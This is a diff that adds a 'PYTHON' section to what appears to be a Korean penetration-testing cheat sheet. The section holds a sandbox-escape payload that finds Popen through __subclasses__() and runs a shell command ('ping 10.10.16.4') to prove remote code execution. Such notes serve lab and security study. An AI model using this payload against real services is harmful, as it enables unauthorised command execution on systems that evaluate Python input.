@@ -164,3 +164,21 @@ curl http://localhost -o output.txt
 - `-v`옵션으로 접속이 `NOT FOUND`인지 `UNAUTHORIZED`인지 확인.
 
 </details>
+
+---
+<details>
+  <summary><strong>PYTHON</strong></summary>
+
+- `CLASS`를 찾아서 RCE 실행.(Popen)
+```python3
+#i = 0;
+#for c in [].__class__.__base__.__subclasses__():
+#    if c.__name__=="P"+"op"+"en":
+#        print(c.__name__);
+#        print(i);
+#    i+=1;
+
+[].__class__.__base__.__subclasses__()[317]('ping 10.10.16.4',shell=True);
+```
+  
+</details>
